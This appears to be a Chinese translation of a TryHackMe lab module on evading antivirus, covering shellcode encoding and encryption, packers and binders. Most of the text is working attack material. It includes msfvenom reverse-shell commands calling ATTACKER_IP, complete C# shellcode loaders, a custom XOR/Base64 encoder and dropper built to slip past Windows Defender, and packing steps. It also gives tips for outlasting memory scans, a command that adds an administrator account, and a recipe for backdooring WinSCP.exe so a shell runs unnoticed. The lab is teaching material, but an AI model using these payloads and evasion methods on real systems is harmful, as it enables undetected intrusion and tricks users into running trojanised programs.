<p>您还可以同时使用两种或多种编码算法，使 AV 更难找出隐藏内容。 下图显示我们将“THM”字符串转换为十六进制表示，然后使用Base64进行编码。 在这种情况下，您需要确保您的释放器现在可以处理此类编码，以将字符串恢复到其原始状态。</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/6b3d06034f60f472a3c3620815d25be1.png" alt="Double Text Encoding Technique"></p>
<p>什么是加密？</p>
<p>加密是信息和数据安全的基本要素之一，其重点是防止未经授权的访问和操纵数据。 加密过程涉及将明文（未加密的内容）转换为称为密文的加密版本。 如果不知道加密中使用的算法以及密钥，则无法读取或解密密文。</p>
<p>与编码一样，加密技术可用于多种目的，例如安全地存储和传输数据以及端到端加密。 加密可以通过两种方式使用：在两方之间使用共享密钥或使用公钥和私钥。</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/7cd2d23f048dd314a46910fb29c9836f.png" alt="Encryption and Decryption Concepts!"></p>
<p>为什么我们需要了解编码和加密？</p>
<p>反病毒供应商使用静态或动态检测技术实施其反病毒软件，以将大多数公共工具（例如 Metasploit 等）列入黑名单。 因此，在不修改这些公共工具生成的 shellcode 的情况下，您的 dropper 的检测率很高。</p>
<p>编码和加密可用于 AV 规避技术，我们对植入程序中使用的 shellcode 进行编码和/或加密，以在运行时将其隐藏起来，不被 AV 软件发现。 而且，这两种技术不仅可以用来隐藏shellcode，还可以用来隐藏函数、变量等。在这个房间里，我们主要关注加密shellcode以逃避Windows Defender。</p>
<h1 id="Shellcode-Encoding-and-Encryption"><a href="#Shellcode-Encoding-and-Encryption" class="headerlink" title="Shellcode Encoding and Encryption"></a>Shellcode Encoding and Encryption</h1><p>使用 MSFVenom 进行编码</p>
<p>Metasploit 等公共工具提供编码和加密功能。 然而，反病毒供应商了解这些工具构建有效负载的方式，并采取措施检测它们。 如果您尝试立即使用此类功能，那么一旦文件接触受害者的磁盘，您的有效负载很可能就会被检测到。</p>
<p>让我们用这个方法生成一个简单的有效负载来证明这一点。 首先，您可以使用以下命令列出 msfvenom 可用的所有编码器：</p>
<p> 列出 Metasploit 框架中的编码器</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">       user@AttackBox$ msfvenom --list encoders | grep excellent</span><br><span class="line">cmd/powershell_base64         excellent  Powershell Base64 Command Encoder</span><br><span class="line">x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder</span><br><span class="line">    </span><br></pre></td></tr></tbody></table></figure>

<p>我们可以通过“-e”（编码器）开关指示我们想要使用“shikata_ga_nai”编码器，然后通过“-i”（迭代）开关指定我们想要对有效负载进行三次编码：</p>
<p> 使用Metasploit框架进行编码（Shikata_ga_nai）</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">           user@AttackBox$ msfvenom -a x86 --platform Windows LHOST=ATTACKER_IP LPORT=443 -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f csharp</span><br><span class="line">Found 1 compatible encoders</span><br><span class="line">Attempting to encode payload with 3 iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size 368 (iteration=0)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 395 (iteration=1)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 422 (iteration=2)</span><br><span class="line">x86/shikata_ga_nai chosen with final size 422</span><br><span class="line">Payload size: 422 bytes</span><br><span class="line">Final size of csharp file: 2170 bytes</span><br><span class="line">        </span><br></pre></td></tr></tbody></table></figure>

<p>如果我们尝试将新生成的有效负载上传到我们的测试机器，AV 会在我们有机会执行它之前立即对其进行标记：</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/747c69e737c96044123329c47845f659.png" alt="Windows Defender detected our payload as malicious!"></p>
<p>如果编码不起作用，我们可以随时尝试加密有效负载。 直观上，我们预计这会有更高的成功率，因为解密有效负载对于反病毒软件来说是一项更艰巨的任务。 现在让我们尝试一下。</p>
<p>使用 MSFVenom 加密</p>
<p>您可以使用 msfvenom 轻松生成加密的有效负载。 然而，加密算法的选择有点稀缺。 要列出可用的加密算法，可以使用以下命令：</p>
<p> 列出 Metasploit 框架中的加密模块</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">           user@AttackBox$ msfvenom --list encrypt</span><br><span class="line">Framework Encryption Formats [--encrypt &lt;value&gt;]</span><br><span class="line">================================================</span><br><span class="line"></span><br><span class="line">    Name</span><br><span class="line">    ----</span><br><span class="line">    aes256</span><br><span class="line">    base64</span><br><span class="line">    rc4</span><br><span class="line">    xor</span><br><span class="line">        </span><br></pre></td></tr></tbody></table></figure>

<p>让我们构建一个 XOR 加密的有效负载。 对于这种类型的算法，您需要指定一个密钥。 该命令如下所示：</p>
<p> 使用 Metasploit 框架对 Shellcode 进行异或</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">           user@AttackBox$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=7788 -f exe --encrypt xor --encrypt-key "MyZekr3tKey***" -o xored-revshell.exe</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x64 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 510 bytes</span><br><span class="line">Final size of exe file: 7168 bytes</span><br><span class="line">Saved as: xored-revshell.exe</span><br><span class="line">        </span><br></pre></td></tr></tbody></table></figure>

<p>再次，如果我们将生成的 shell 上传到 THM 防病毒检查！ 页面“<a target="_blank" rel="noopener" href="http://10.10.21.255/%E2%80%9D%EF%BC%8C%E5%AE%83%E4%BB%8D%E7%84%B6%E4%BC%9A%E8%A2%AB">http://10.10.21.255/”，它仍然会被</a> AV 标记。 原因仍然是 AV 供应商投入了大量时间来确保检测到简单的 msfvenom 有效负载。</p>
<p>创建自定义有效负载</p>
<p>克服这个问题的最佳方法是使用我们自己的自定义编码方案，这样反病毒软件就不知道如何分析我们的有效负载。 请注意，您不必做任何太复杂的事情，只要它足以让 AV 进行分析即可。 对于此任务，我们将采用 msfvenom 生成的简单反向 shell，并使用 XOR 和 Base64 的组合来绕过 Defender。</p>
<p>让我们首先使用 msfvenom 生成 CSharp 格式的反向 shell：</p>
<p> 生成CSharp shellcode格式</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">user@AttackBox$ msfvenom LHOST=ATTACKER_IP LPORT=443 -p windows/x64/shell_reverse_tcp -f csharp</span><br></pre></td></tr></tbody></table></figure>

<p>编码器</p>
<p>在构建实际的有效负载之前，我们将创建一个程序，该程序将采用 msfvenom 生成的 shellcode 并以我们喜欢的任何方式对其进行编码。 在这种情况下，我们将首先使用自定义密钥对有效负载进行异或，然后使用 base64 对其进行编码。 以下是编码器的完整代码（您还可以在 Windows 计算机中的 C:\Tools\CS Files\Encryptor.cs 中找到此代码）：</p>
<figure class="highlight csharp"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Threading.Tasks;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Encrypter</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">internal</span> <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    {</span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] <span class="title">xor</span>(<span class="params"><span class="built_in">byte</span>[] shell, <span class="built_in">byte</span>[] KeyBytes</span>)</span></span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; shell.Length; i++)</span><br><span class="line">            {</span><br><span class="line">                shell[i] ^= KeyBytes[i % KeyBytes.Length];</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">return</span> shell;</span><br><span class="line">        }</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        {</span><br><span class="line">            <span class="comment">//XOR Key - It has to be the same in the Droppr for Decrypting</span></span><br><span class="line">            <span class="built_in">string</span> key = <span class="string">"THMK3y123!"</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//Convert Key into bytes</span></span><br><span class="line">            <span class="built_in">byte</span>[] keyBytes = Encoding.ASCII.GetBytes(key);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//Original Shellcode here (csharp format)</span></span><br><span class="line">            <span class="built_in">byte</span>[] buf = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">460</span>] { <span class="number">0xfc</span>,<span class="number">0x48</span>,<span class="number">0x83</span>,..,<span class="number">0xda</span>,<span class="number">0xff</span>,<span class="number">0xd5</span> };</span><br><span class="line"></span><br><span class="line">            <span class="comment">//XORing byte by byte and saving into a new array of bytes</span></span><br><span class="line">            <span class="built_in">byte</span>[] encoded = xor(buf, keyBytes);</span><br><span class="line">            Console.WriteLine(Convert.ToBase64String(encoded));        </span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>该代码非常简单，将生成一个编码的有效负载，我们将其嵌入到最终的有效负载中。 请记住将“buf”变量替换为使用 msfvenom 生成的 shellcode。</p>
<p>为了编译并执行编码器，我们可以在Windows机器上使用以下命令：</p>
<p> 编译并运行我们的自定义 CSharp 编码器</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">           C:\&gt; csc.exe Encrypter.cs</span><br><span class="line">C:\&gt; .\Encrypter.exe</span><br><span class="line">qKDPSzN5UbvWEJQsxhsD8mM+uHNAwz9jPM57FAL....pEvWzJg3oE=</span><br></pre></td></tr></tbody></table></figure>

<p>自解码有效负载</p>
<p>由于我们有一个编码的有效负载，我们需要调整我们的代码，以便它在执行之前解码 shellcode。 为了匹配编码器，我们将以与编码相反的顺序解码所有内容，因此我们首先解码 Base64 内容，然后继续使用我们在编码器中使用的相同密钥对结果进行异或。 这是完整的有效负载代码（您也可以在 Windows 计算机中的“C:\Tools\CS Files\EncStageless.cs”中获取它）：</p>
<figure class="highlight csharp"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Net;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.InteropServices;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Program</span> {</span><br><span class="line">  [<span class="meta">DllImport(<span class="string">"kernel32"</span>)</span>]</span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">VirtualAlloc</span>(<span class="params">UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect</span>)</span>;</span><br><span class="line"></span><br><span class="line">  [<span class="meta">DllImport(<span class="string">"kernel32"</span>)</span>]</span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">CreateThread</span>(<span class="params">UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, <span class="keyword">ref</span> UInt32 lpThreadId</span>)</span>;</span><br><span class="line"></span><br><span class="line">  [<span class="meta">DllImport(<span class="string">"kernel32"</span>)</span>]</span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">WaitForSingleObject</span>(<span class="params">IntPtr hHandle, UInt32 dwMilliseconds</span>)</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> UInt32 MEM_COMMIT = <span class="number">0x1000</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> UInt32 PAGE_EXECUTE_READWRITE = <span class="number">0x40</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] <span class="title">xor</span>(<span class="params"><span class="built_in">byte</span>[] shell, <span class="built_in">byte</span>[] KeyBytes</span>)</span></span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; shell.Length; i++)</span><br><span class="line">            {</span><br><span class="line">                shell[i] ^= KeyBytes[i % KeyBytes.Length];</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">return</span> shell;</span><br><span class="line">        }</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>()</span></span><br><span class="line">  {</span><br><span class="line"></span><br><span class="line">    <span class="built_in">string</span> dataBS64 = <span class="string">"qKDPSzN5UbvWEJQsxhsD8mM+uHNAwz9jPM57FAL....pEvWzJg3oE="</span>;</span><br><span class="line">    <span class="built_in">byte</span>[] data = Convert.FromBase64String(dataBS64);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">string</span> key = <span class="string">"THMK3y123!"</span>;</span><br><span class="line">    <span class="comment">//Convert Key into bytes</span></span><br><span class="line">    <span class="built_in">byte</span>[] keyBytes = Encoding.ASCII.GetBytes(key);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">byte</span>[] encoded = xor(data, keyBytes);</span><br><span class="line"></span><br><span class="line">    UInt32 codeAddr = VirtualAlloc(<span class="number">0</span>, (UInt32)encoded.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    Marshal.Copy(encoded, <span class="number">0</span>, (IntPtr)(codeAddr), encoded.Length);</span><br><span class="line"></span><br><span class="line">    IntPtr threadHandle = IntPtr.Zero;</span><br><span class="line">    UInt32 threadId = <span class="number">0</span>;</span><br><span class="line">    IntPtr parameter = IntPtr.Zero;</span><br><span class="line">    threadHandle = CreateThread(<span class="number">0</span>, <span class="number">0</span>, codeAddr, parameter, <span class="number">0</span>, <span class="keyword">ref</span> threadId);</span><br><span class="line"></span><br><span class="line">    WaitForSingleObject(threadHandle, <span class="number">0xFFFFFFFF</span>);</span><br><span class="line"></span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>请注意，我们只是组合了一些单独使用时检测到的非常简单的技术。 不过，AV 这次不会抱怨有效负载，因为这两种方法的组合并不是它可以直接分析的东西。</p>
<p>让我们在 Windows 机器上使用以下命令编译有效负载：</p>
<p> 编译我们的加密有效负载</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt; csc.exe EncStageless.cs</span><br></pre></td></tr></tbody></table></figure>

<p>在运行我们的有效负载之前，让我们设置一个“nc”监听器。 将有效负载复制并执行到受害者计算机后，我们应该按预期恢复连接：</p>
<p> 设置 nc 监听器</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">           user@AttackBox$ nc -lvp 443</span><br><span class="line">Listening on [0.0.0.0] (family 0, port 443)</span><br><span class="line">Connection from ip-10-10-139-83.eu-west-1.compute.internal 49817 received!</span><br><span class="line">Microsoft Windows [Version 10.0.17763.1821]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\System32&gt;</span><br><span class="line">        </span><br></pre></td></tr></tbody></table></figure>

<p>正如您所看到的，有时简单的调整就足够了。 大多数时候，您在网上找到的任何特定方法都可能无法立即使用，因为它们的检测签名可能已经存在。 然而，使用一点想象力来定制任何方法都足以成功绕过。</p>
<h1 id="Packers"><a href="#Packers" class="headerlink" title="Packers"></a>Packers</h1><p>另一种击败基于磁盘的 AV 检测的方法是使用加壳程序。 <strong>加壳程序</strong>是一种软件，它将程序作为输入并对其进行转换，使其结构看起来不同，但它们的功能保持完全相同。 包装工这样做有两个主要目标：</p>
<ul>
<li>压缩程序，使其占用更少的空间。</li>
<li>一般而言，保护程序免受逆向工程的影响。</li>
</ul>
<p>想要保护其软件免遭逆向工程或破解的软件开发人员通常会使用加壳程序。 它们通过实施混合转换（包括压缩、加密、添加调试保护等）来实现一定程度的保护。 正如您可能已经猜到的那样，加壳程序也常用于轻松混淆恶意软件。</p>
<p>市面上有相当多的加壳程序，包括 UPX、MPRESS、Themida 等。</p>
<p>打包应用程序</p>
<p>虽然每个加壳器的操作方式都不同，但让我们看一个简单的加壳器会做什么的基本示例。</p>
<p>当应用程序被打包时，它将使用<strong>打包</strong>函数以某种方式进行转换。 打包函数需要能够通过<strong>解包</strong>函数合理地逆转的方式混淆和转换应用程序的原始代码，以便保留应用程序的原始功能。 虽然有时加壳器可能会添加一些代码（例如，使调试应用程序变得更加困难），但它通常希望能够取回您在执行时编写的原始代码。</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9aacb2fab2a656ffc82a7b0344918062.png" alt="packers"></p>
<p>应用程序的打包版本将包含您的打包应用程序代码。 由于这个新的打包代码已被混淆，因此应用程序需要能够从中解包原始代码。 为此，加壳器将嵌入一个包含解壳器的代码存根，并将可执行文件的主入口点重定向到它。</p>
<p>当您的打包应用程序被执行时，将会发生以下情况：</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/408fb909374c2b54bebef9809eaa417a.png" alt="packed app"></p>
<ol>
<li>首先执行解包程序，因为它是可执行文件的入口点。</li>
<li>解包程序读取加壳应用程序的代码。</li>
<li>解包器会将原始解包代码写入内存中的某个位置，并将应用程序的执行流程定向到该处。</li>
</ol>
<p>加壳器和 AV</p>
<p>现在，我们可以看到加壳程序如何帮助绕过 AV 解决方案。 假设您构建了一个反向 shell 可执行文件，但反病毒软件将其视为恶意软件，因为它与已知签名匹配。 在这种情况下，使用加壳器将转换反向 shell 可执行文件，使其与磁盘上的任何已知签名不匹配。 因此，您应该能够将有效负载分发到任何计算机的磁盘上，而不会出现太大问题。</p>
<p>然而，AV 解决方案仍然可以捕获您的打包应用程序，原因如下：</p>
<ul>
<li>虽然您的原始代码可能会转换为无法识别的内容，但请记住，打包的可执行文件包含带有解包程序代码的存根。 如果解包程序具有已知签名，反病毒解决方案仍可能仅根据解包程序存根标记任何已打包的可执行文件。</li>
<li>在某些时候，您的应用程序会将原始代码解压到内存中，以便可以执行它。 如果您尝试绕过的反病毒解决方案可以进行内存扫描，则在解压您的代码后仍可能会检测到您。</li>
</ul>
<p>打包我们的 shellcode</p>
<p>让我们从基本的 C# shellcode 开始。 您还可以在 Windows 计算机中的“C:\Tools\CS Files\UnEncStagelessPayload.cs”中找到此代码：</p>
<figure class="highlight csharp"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Net;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Configuration.Install;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.InteropServices;</span><br><span class="line"><span class="keyword">using</span> System.Security.Cryptography.X509Certificates;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Program</span> {</span><br><span class="line">  [<span class="meta">DllImport(<span class="string">"kernel32"</span>)</span>]</span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">VirtualAlloc</span>(<span class="params">UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect</span>)</span>;</span><br><span class="line"></span><br><span class="line">  [<span class="meta">DllImport(<span class="string">"kernel32"</span>)</span>]</span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">CreateThread</span>(<span class="params">UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, <span class="keyword">ref</span> UInt32 lpThreadId</span>)</span>;</span><br><span class="line"></span><br><span class="line">  [<span class="meta">DllImport(<span class="string">"kernel32"</span>)</span>]</span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">WaitForSingleObject</span>(<span class="params">IntPtr hHandle, UInt32 dwMilliseconds</span>)</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> UInt32 MEM_COMMIT = <span class="number">0x1000</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> UInt32 PAGE_EXECUTE_READWRITE = <span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>()</span></span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">byte</span>[] shellcode = <span class="keyword">new</span> <span class="built_in">byte</span>[] {<span class="number">0xfc</span>,<span class="number">0x48</span>,<span class="number">0x83</span>,...,<span class="number">0xda</span>,<span class="number">0xff</span>,<span class="number">0xd5</span> };</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    UInt32 codeAddr = VirtualAlloc(<span class="number">0</span>, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    Marshal.Copy(shellcode, <span class="number">0</span>, (IntPtr)(codeAddr), shellcode.Length);</span><br><span class="line"></span><br><span class="line">    IntPtr threadHandle = IntPtr.Zero;</span><br><span class="line">    UInt32 threadId = <span class="number">0</span>;</span><br><span class="line">    IntPtr parameter = IntPtr.Zero;</span><br><span class="line">    threadHandle = CreateThread(<span class="number">0</span>, <span class="number">0</span>, codeAddr, parameter, <span class="number">0</span>, <span class="keyword">ref</span> threadId);</span><br><span class="line"></span><br><span class="line">    WaitForSingleObject(threadHandle, <span class="number">0xFFFFFFFF</span>);</span><br><span class="line"></span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>该有效负载采用 msfvenom 生成的 shellcode 并将其运行到单独的线程中。 为此，您需要生成一个新的 shellcode 并将其放入代码的“shellcode”变量中：</p>
<p> 命令提示符</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt; msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=7478 -f csharp</span><br></pre></td></tr></tbody></table></figure>

<p>然后，您可以使用以下命令在 Windows 计算机中编译有效负载：</p>
<p> 命令提示符</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt; csc UnEncStagelessPayload.cs</span><br></pre></td></tr></tbody></table></figure>

<p>一旦您有了可用的可执行文件，您就可以尝试将其上传到 THM 防病毒检查！ 页面（桌面上的链接）。 反病毒软件应立即对其进行标记。 让我们在相同的有效负载上使用加壳器，看看会发生什么。</p>
<p>我们将使用 <a target="_blank" rel="noopener" href="https://github.com/mkaring/ConfuserEx/releases/tag/v1.6.0">ConfuserEx</a> 打包程序来完成此任务，因为我们的有效负载是在“.NET”上编程的。 为了方便起见，您可以在桌面上找到它的快捷方式。</p>
<p>ConfuserEx 将要求您指定它将在其中运行的文件夹。 请务必选择您的桌面作为基本目录，如下图所示。 设置好基本目录后，将要打包的可执行文件拖放到界面上，最终应该得到以下结果：</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9214df2a88ffffbf8561502aa19a375c.png" alt="Packer config part1"></p>
<p>让我们转到设置选项卡并选择我们的有效负载。 选择后，点击“+”按钮将设置添加到您的负载中。 这应该创建一个名为“true”的规则。 确保也启用压缩：</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/857e5540e14f4ebf743fbd4d2f8ee503.png" alt="Packer config part2"></p>
<p>我们现在将编辑“true”规则并将其设置为最大预设：</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/96946f1aff585a91e78408b96e446ea4.png" alt="packer config part3"></p>
<p>最后，我们将进入“Protect！” 选项卡并点击“Protect”：</p>
<p> <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/e0e3ca97245641d3954f26fa986aae87.png" alt="packer config part 4"></p>
<p>新的有效负载应该已准备就绪，并且希望在上传到 THM 防病毒检查器时不会触发任何警报！ （桌面上有快捷方式）。 事实上，如果你执行你的有效负载并设置一个“nc”监听器，你应该能够得到一个 shell：</p>
<p>​            AttackBox        </p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">user@attackbox$ nc -lvp 7478   </span><br></pre></td></tr></tbody></table></figure>

<p>到目前为止，一切都很好，但还记得我们讨论过 AV 进行内存扫描吗？ 如果您尝试在反向 shell 上运行命令，AV 会注意到您的 shell 并杀死它。 这是因为 Windows Defender 将挂钩某些 Windows API 调用，并在使用此类 API 调用时进行内存扫描。 对于使用 msfvenom 生成的任何 shell，都会调用并检测 CreateProcess()。</p>
<p>所以我们现在怎么办？</p>
<p>虽然击败内存扫描超出了本房间的范围，但您可以采取一些简单的措施来避免检测：</p>
<ul>
<li><strong>请稍等一下</strong>。 尝试再次生成反向 shell，并等待大约 5 分钟，然后再发送任何命令。 你会发现 AV 不会再抱怨了。 原因是扫描内存是一项昂贵的操作。 因此，AV 会在您的进程启动后执行一段时间，但最终会停止。</li>
<li><strong>使用较小的有效负载</strong>。 有效负载越小，被检测到的可能性就越小。 如果您使用 msfvenom 来执行单个命令而不是反向 shell，那么 AV 将更难检测到它。 您可以尝试使用“msfvenom -a x64 -p windows/x64/exec CMD=’net user pwnd Password321 /add;net localgroupadministrators pwnd /add’ -f csharp”，看看会发生什么。</li>
</ul>
<p>如果检测不是问题，您甚至可以使用一个简单的技巧。 从反向 shell 中再次运行“cmd.exe”。 AV 将检测您的有效负载并杀死相关进程，但不会杀死您刚刚生成的新 cmd.exe。</p>
<p>虽然每个 AV 的行为都会有所不同，但大多数时候，它们周围都会有类似的方式，因此值得探索您在测试时注意到的任何奇怪行为。</p>
<h1 id="Binders"><a href="#Binders" class="headerlink" title="Binders"></a>Binders</h1><p>虽然绑定器不是 AV 绕过方法，但在设计要分发给最终用户的恶意负载时也很重要。 <strong>binder</strong> 是一种将两个（或多个）可执行文件合并为一个可执行文件的程序。 当您想要分发隐藏在另一个已知程序中的有效负载以欺骗用户，让他们相信他们正在执行不同的程序时，通常会使用它。</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/5c72d80a077a1f8a813a70c01a6561e9.png" alt="binder"></p>
<p>虽然每个绑定程序的工作方式可能略有不同，但它们基本上会将您的 shellcode 代码添加到合法程序中并以某种方式执行它。</p>
<p>例如，您可以更改 PE 标头中的入口点，以便 shellcode 在程序之前执行，然后在完成后将执行重定向回合法程序。 这样，当用户单击生成的可执行文件时，您的 shellcode 将首先以静默方式执行，并继续正常运行程序，而用户不会注意到。</p>
<p>与 msfvenom 结合</p>
<p>您可以使用“msfvenom”轻松地将您偏好的有效负载植入到任何 .exe 文件中。 该二进制文件仍将照常工作，但会静默执行额外的有效负载。 msfvenom使用的方法通过为其创建一个额外的线程来注入您的恶意程序，因此它与前面提到的略有不同，但达到了相同的结果。 拥有一个单独的线程会更好，因为如果你的 shellcode 由于某种原因失败，你的程序不会被阻塞。</p>
<p>对于此任务，我们将对“C:\Tools\WinSCP”中可用的 WinSCP 可执行文件进行后门处理。</p>
<p>要创建后门 WinSCP.exe，我们可以在 Windows 计算机上使用以下命令：</p>
<p><strong>注意：</strong> 为了方便起见，Metasploit 安装在 Windows 计算机中，但生成有效负载可能需要长达三分钟的时间（可以安全地忽略生成的警告）。</p>
<p>​            AttackBox        </p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt; msfvenom -x WinSCP.exe -k -p windows/shell_reverse_tcp lhost=ATTACKER_IP lport=7779 -f exe -o WinSCP-evil.exe </span><br></pre></td></tr></tbody></table></figure>

<p>生成的 WinSCP-evil.exe 将在用户没有注意到的情况下执行reverse_tcp meterpreter有效负载。 首先，请记住设置一个“nc”监听器来接收反向 shell。 当您执行后门可执行文件时，它应该向您启动反向 shell，同时继续为用户执行 WinSCP.exe：</p>
<table>
<thead>
<tr>
<th><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/06c3bd06d935a937b2af7dace6a41a27.png" alt="winscp execution"></th>
<th>➜</th>
<th>AttackBox                <code>user@attackbox$ nc -lvp 7779       Listening on 0.0.0.0 7779 Connection received on 10.10.183.127 49813 Microsoft Windows [Version 10.0.17763.1821] (c) 2018 Microsoft Corporation. All rights reserved. C:\Windows\system32&gt;        </code></th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>绑定器和 AV</p>
<p>Binders 不会对 AV 解决方案隐藏您的有效负载做太多事情。 在不进行任何更改的情况下连接两个可执行文件的简单事实意味着生成的可执行文件仍将触发原始有效负载所做的任何签名。</p>
<p>绑定器的主要用途是欺骗用户，让他们相信他们正在执行合法的可执行文件而不是恶意负载。</p>
